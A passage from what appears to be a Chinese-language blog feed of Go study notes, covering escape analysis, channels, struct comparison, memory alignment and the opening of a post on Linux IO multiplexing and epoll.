        <content type="html"><![CDATA[<p>一般来说，局部变量会在函数返回后被销毁，因此被返回的引用就成为了”无所指”的引用，程序会进入未知状态。<br><strong>但这在 Go 中是安全的，Go 编译器将会对每个局部变量进行逃逸分析。如果发现局部变量的作用域超出该函数，则不会将内存分配在栈上，而是分配在堆上，因为他们不在栈区，即使释放函数，其内容也不会受影响。</strong><br>编译时可以借助选项 -gcflags=-m，查看变量逃逸的情况。<br><img src="http://106.12.125.218/medias/medias/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go使用指针类型作为方法的接收者的理由</title>
      <link href="/2022/05/13/go%E4%BD%BF%E7%94%A8%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E4%BD%9C%E4%B8%BA%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A5%E6%94%B6%E8%80%85%E7%9A%84%E7%90%86%E7%94%B1/"/>
      <url>/2022/05/13/go%E4%BD%BF%E7%94%A8%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E4%BD%9C%E4%B8%BA%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A5%E6%94%B6%E8%80%85%E7%9A%84%E7%90%86%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<ul><li>使用指针类型能够修改调用者的值。 </li><li>使用指针类型可以避免在每次调用方法时复制该值，在值的类型为大型结构体时，这样做会更加高效</li></ul>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go有哪些关键字</title>
      <link href="/2022/05/13/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2022/05/13/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<p>go中有25个关键字<br><img src="http://106.12.125.218/medias/medias/go%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97/1.png"><br>注：fallthrough是用于打破switch中默认break的限制</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go两个struct实例能否比较</title>
      <link href="/2022/05/12/go%E4%B8%A4%E4%B8%AAstruct%E5%AE%9E%E4%BE%8B%E8%83%BD%E5%90%A6%E6%AF%94%E8%BE%83/"/>
      <url>/2022/05/12/go%E4%B8%A4%E4%B8%AAstruct%E5%AE%9E%E4%BE%8B%E8%83%BD%E5%90%A6%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<h2 id="同一个struct的2个实例能不能用-或者-比较"><a href="#同一个struct的2个实例能不能用-或者-比较" class="headerlink" title="同一个struct的2个实例能不能用==  或者 !=比较"></a>同一个struct的2个实例能不能用==  或者 !=比较</h2><p>可以比较的情况：<br>1。结构体当中没有不可比较的类型，比如slice和map<br>2，必须得是同一个结构体的实例<br>如果有不可比较的类型的话，用reflect.DeepEqual(,),如果是相同类型并且值都一样则true，如果是不同类型直接false。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go_channel简介</title>
      <link href="/2022/05/12/go_channel%E7%AE%80%E4%BB%8B/"/>
      <url>/2022/05/12/go_channel%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="channel-简介"><a href="#channel-简介" class="headerlink" title="channel 简介"></a>channel 简介</h3><p>goroutine 是 Go 中实现并发的重要机制，channel 是 goroutine 之间进行通信的重要桥梁。<br>使用内建函数 make 可以创建 channel，举例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)  <span class="comment">// 注意： channel 必须定义其传递的数据类型 </span></span><br></pre></td></tr></table></figure><p>也可以用 var 声明 channel, 如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">int</span> </span><br></pre></td></tr></table></figure><p>以上声明的 channel 都是双向的，意味着可以该 channel 可以发送数据，也可以接收数据。<br>“发送”和“接收”是 channel 的两个基本操作。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- x <span class="comment">// channel 接收数据 x</span></span><br><span class="line"></span><br><span class="line">x &lt;- ch <span class="comment">// channel 发送数据并赋值给 x</span></span><br><span class="line"></span><br><span class="line">&lt;- ch <span class="comment">// channel 发送数据，忽略接受者</span></span><br></pre></td></tr></table></figure><h3 id="channel-buffer"><a href="#channel-buffer" class="headerlink" title="channel buffer"></a>channel buffer</h3><p>上文提到，可以通过 make(chan int) 创建channel，此类 channel 称之为非缓冲通道。事实上 channel 可以定义缓冲大小，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chInt := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)       <span class="comment">// unbuffered channel  非缓冲通道</span></span><br><span class="line">chBool := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">0</span>)  <span class="comment">// unbuffered channel  非缓冲通道</span></span><br><span class="line">chStr := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">2</span>) <span class="comment">// bufferd channel     缓冲通道</span></span><br></pre></td></tr></table></figure><p>需要注意的是，程序中必须同时有不同的 goroutine 对非缓冲通道进行发送和接收操作，否则会造成阻塞。<br>以下是一个错误的使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段代码运行后提示错误： fatal error: all goroutines are asleep - deadlock!。<br>因为 main 函数是一个 goroutine, 在这一个 goroutine 中发送了数据给非缓冲通道，但是却没有另外一个 goroutine 从非缓冲通道中里读取数据， 所以造成了阻塞或者称为死锁。<br>在以上代码中添加一个 goroutine 从非缓冲通道中读取数据，程序就可以正常工作。如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与非缓冲通道不同，缓冲通道可以在同一个 goroutine 内接收容量范围内的数据，即便没有另外的 goroutine 进行读取操作，如下代码可以正常执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单向-channel"><a href="#单向-channel" class="headerlink" title="单向 channel"></a>单向 channel</h3><p>单向通道即限定了该 channel 只能接收或者发送数据，单向通道通常作为函数的参数，如下例所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(receiver <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>, msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    receiver &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(sender &lt;-<span class="keyword">chan</span> <span class="keyword">string</span>, receiver <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    msg := &lt;-sender</span><br><span class="line">    receiver &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    receive(ch1, <span class="string">&quot;pass message&quot;</span>)</span><br><span class="line">    send(ch1, ch2)</span><br><span class="line"></span><br><span class="line">    fmt.Println(&lt;-ch2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，在变量声明中是不应该出现单向通道的，因为通道本来就是为了通信而生，只能接收或者只能发送数据的通道是没有意义的。 请看下面这个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> &lt;- <span class="keyword">string</span> , <span class="number">1</span>)</span><br><span class="line">    ch &lt;- <span class="string">&quot;str&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子中定义了一个只能用来接收数据的通道，从语法上来看没有错误，但这是一种糟糕的实践。</p><h3 id="channel-遍历和关闭"><a href="#channel-遍历和关闭" class="headerlink" title="channel 遍历和关闭"></a>channel 遍历和关闭</h3><p>close() 函数可以用于关闭 channel，关闭后的 channel 中如果有缓冲数据，依然可以读取，但是无法再发送数据给已经关闭的channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line"></span><br><span class="line">    res := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        res += v</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="select-语句"><a href="#select-语句" class="headerlink" title="select 语句"></a>select 语句</h3><p>select 专门用于通道发送和接收操作，看起来和 switch 很相似，但是进行选择和判断的方法完全不同。<br>在下述例子中，通过 select 的使用，保证了 worker 中的事务可以执行完毕后才退出 main 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strWorker</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;do something with strWorker...&quot;</span>)</span><br><span class="line">    ch &lt;- <span class="string">&quot;str&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intWorker</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;do something with intWorker...&quot;</span>)</span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    chStr := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    chInt := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> strWorker(chStr)</span><br><span class="line">    <span class="keyword">go</span> intWorker(chInt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-chStr:</span><br><span class="line">            fmt.Println(<span class="string">&quot;get value from strWorker&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> &lt;-chInt:</span><br><span class="line">            fmt.Println(<span class="string">&quot;get value from intWorker&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考： 如果上述例子中，没有这个 select ，那么 worker 函数是否有机会执行？<br>实际情况是没有，因为main也是一个协程，运行完之后就退出了。</p><h3 id="通过-channel-实现同步机制"><a href="#通过-channel-实现同步机制" class="headerlink" title="通过 channel 实现同步机制"></a>通过 channel 实现同步机制</h3><p>一个经典的例子如下，main 函数中起了一个 goroutine，通过非缓冲队列的使用，能够保证在 goroutine 执行结束之前 main 函数不会提前退出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="keyword">bool</span>)</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;start working...&quot;</span>)</span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;end working...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思考：如果把上述例子中的 &lt;-done 注释掉，运行结果会如何？<br>done注释掉则不会起到阻塞的效果，所以不会有任何输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="keyword">bool</span>)</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;start working...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    fmt.Println(<span class="string">&quot;end working...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    done &lt;- <span class="literal">true</span> <span class="comment">// done放在最下面可以保证上面两行都能输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考资料<br><a href="https://songjiayang.gitbooks.io/go-basic-courses/content/ch7/channel.html">https://songjiayang.gitbooks.io/go-basic-courses/content/ch7/channel.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go内存对齐</title>
      <link href="/2022/05/12/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/"/>
      <url>/2022/05/12/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="字长（word-size）"><a href="#字长（word-size）" class="headerlink" title="字长（word size）"></a>字长（word size）</h2><p>字长（word size），指的是 CPU 一次可以访问数据的最大长度：</p><ul><li>对于 32 位的 cpu 来说：word size 为 2^32，即 4 byte</li><li>对于 64 位的 cpu 来说：word size 为 2^64，即 8 byte</li></ul><h2 id="两种内存布局"><a href="#两种内存布局" class="headerlink" title="两种内存布局"></a>两种内存布局</h2><p>下边是一个结构体的两种内存布局方式</p><h3 id="第一种：按顺序"><a href="#第一种：按顺序" class="headerlink" title="第一种：按顺序"></a>第一种：按顺序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Foo <span class="keyword">struct</span> &#123;</span><br><span class="line">    A <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">    B <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">    C <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Bar <span class="keyword">struct</span> &#123;</span><br><span class="line">    x <span class="keyword">int32</span> <span class="comment">// 4</span></span><br><span class="line">    y *Foo  <span class="comment">// 8</span></span><br><span class="line">    z <span class="keyword">bool</span>  <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你觉得 Bar 对象会占用多少的内存？ 可能很多人会下意识地回答 <strong>13</strong><br>会回答 13 是因为你觉得该结构体的内存分配是下面这样按顺利分配的。<br>按照前面所介绍的 word size 为 8 来计算，使用这种分配方式，当你访问 bar.y 的时候，CPU 需要访问内存两次。<br><img src="http://106.12.125.218/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/4.png"></p><h3 id="第二种：按字长"><a href="#第二种：按字长" class="headerlink" title="第二种：按字长"></a>第二种：按字长</h3><p>而如果使用下面这种方式，当你再次访问 bar.y 的时候，CPU 需要访问内存一次。<br><img src="http://106.12.125.218/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/5.png"><br>因此真正的答案是 <strong>24</strong>，这是一种典型的用空间换时间的方法 — <strong>内存对齐</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> bar Bar</span><br><span class="line">    fmt.Println(unsafe.Sizeof(bar))  <span class="comment">// 24</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="合理定义结构体"><a href="#合理定义结构体" class="headerlink" title="合理定义结构体"></a>合理定义结构体</h2><h3 id="对齐原则"><a href="#对齐原则" class="headerlink" title="对齐原则"></a>对齐原则</h3><ol><li>每个成员变量的对齐值是操作系统的默认对齐长度和成员变量长度取最小值，偏移量必须是对齐值的整数倍（默认对齐数可以改，比如可以改成1，但是不建议这么做）</li><li>整个结构体的地址必须是成员变量最大字节的整数倍(结构体的内存占用是1/4/8/16byte…)</li></ol><p>从以上可以发现，我们定义的结构体虽然不大，只占用 24个byte，但实际有用的只有 13 的byte，内存使用率只有 50% 左右，很有优化的必要性。<br>如果将第三个属性挪 y 的前面<br><img src="http://106.12.125.218/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/6.png"><br>那就可以省下来 1 个 byte 了,<strong>这里体现了第一条原则</strong><br>可以使用unsafe.Sizeof()查看对齐系数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> bar Bar</span><br><span class="line">    fmt.Println(unsafe.Sizeof(bar))  <span class="comment">// 16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>下面体现了第二条原则</strong><br><img src="http://106.12.125.218/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言中的内存逃逸现象</title>
      <link href="/2022/05/10/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8%E7%8E%B0%E8%B1%A1/"/>
      <url>/2022/05/10/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8%E7%8E%B0%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="内存逃逸是干什么的"><a href="#内存逃逸是干什么的" class="headerlink" title="内存逃逸是干什么的"></a>内存逃逸是干什么的</h2><p>内存逃逸分析指的是编译器在编译优化时来决定变量应该分配在堆上还是栈上。</p><h2 id="为什么要尽量避免内存逃逸"><a href="#为什么要尽量避免内存逃逸" class="headerlink" title="为什么要尽量避免内存逃逸"></a>为什么要尽量避免内存逃逸</h2><p>因为如果变量的内存发生逃逸，它的生命周期就是不可知的，其会被分配到堆上，而堆上分配内存不能像栈一样会自动释放，为了解放程序员双手，专注于业务的实现，go实现了gc垃圾回收机制，但gc会影响程序运行性能，所以要尽量减少程序的gc操作。</p><h2 id="引发内存逃逸的常见情况"><a href="#引发内存逃逸的常见情况" class="headerlink" title="引发内存逃逸的常见情况"></a>引发内存逃逸的常见情况</h2><ol><li>在方法内把局部变量指针返回，被外部引用，其生命周期大于栈，则溢出。</li><li>发送指针或带有指针的值到channel，因为编译时候无法知道哪个goroutine会在channel接收数据，编译器无法知道什么时候释放。</li><li>在一个切片上存储指针或带指针的值。比如[]*string，导致切片内容逃逸，其引用值一直在堆上。</li><li>因为切片的append导致超出容量，切片重新分配地址，切片背后的存储基于运行时的数据进行扩充，就会在堆上分配。</li><li>在interface类型上调用方法，在Interface调用方法是动态调度的，只有在运行时才知道。</li></ol><h2 id="如何避免内存逃逸"><a href="#如何避免内存逃逸" class="headerlink" title="如何避免内存逃逸"></a>如何避免内存逃逸</h2><ol><li>不要盲目使用变量指针作为参数，虽然减少了复制，但变量逃逸的开销更大。</li><li>预先设定好slice长度，避免频繁超出容量，重新分配。</li><li>一个经验是，指针指向的数据大部分在堆上分配的，请注意。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux之io多路复用与epoll</title>
      <link href="/2022/05/09/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/"/>
      <url>/2022/05/09/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/</url>
      
        <content type="html"><![CDATA[<h2 id="IO-多路复用概述"><a href="#IO-多路复用概述" class="headerlink" title="IO 多路复用概述"></a>IO 多路复用概述</h2><p>I/O 多路复用技术是为了解决进程或线程阻塞到某个 I/O 系统调用而出现的技术，使进程不阻塞于某个特定的 I/O 系统调用。<br>在IO多路复用技术描述前，先讲解下同步，异步，阻塞，非阻塞的概念。</p><h2 id="网络IO模型"><a href="#网络IO模型" class="headerlink" title="网络IO模型"></a>网络IO模型</h2><p>linux网络IO中涉及到的模型如下：<br>（1）阻塞式IO<br>（2）非阻塞式IO<br>（3）IO多路复用<br>（4）信号驱动IO<br>（5）异步IO<br>今天不谈信号驱动IO，略过..</p><h2 id="同步-异步"><a href="#同步-异步" class="headerlink" title="同步/异步"></a>同步/异步</h2><p>在学习IO模型的时候，我们必须明确一个概念，处理 IO 的时候，阻塞和非阻塞都是同步的 IO。<br>只有使用了特殊的 API 才是异步 IO，例如Linux网络中的AIO。</p><p><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/0.png"></p><p>再看下POSIX对同步和异步这两个术语的定义:</p><ul><li>同步IO操作：导致请求进程阻塞，直到I/O操作完成；</li><li>异步IO操作：不导致请求进程阻塞；</li></ul><p>通俗的理解就是同步和异步</p><ul><li>同步：当执行系统调用read时，需要用户等待内核完成从内核缓冲区到用户缓冲区的数据拷贝。</li><li>异步：当执行异步IO操作例如aio_read时，用户不需要等待，只需要接收内核完成操作的通知，由内核来完成数据的读取。<h2 id="阻塞-非阻塞"><a href="#阻塞-非阻塞" class="headerlink" title="阻塞/非阻塞"></a>阻塞/非阻塞</h2>在知晓阻塞和非阻塞都是同步 IO后，阻塞和非阻塞就很好理解了<br>阻塞IO：由系统调用read,导致线程一直等待数据返回。<br>非阻塞IO：系统调用read后立即返回一个状态，当数据达到内核缓冲区之前都是非阻塞的，即返回一个系统调用状态。</li></ul><h2 id="IO多路复用"><a href="#IO多路复用" class="headerlink" 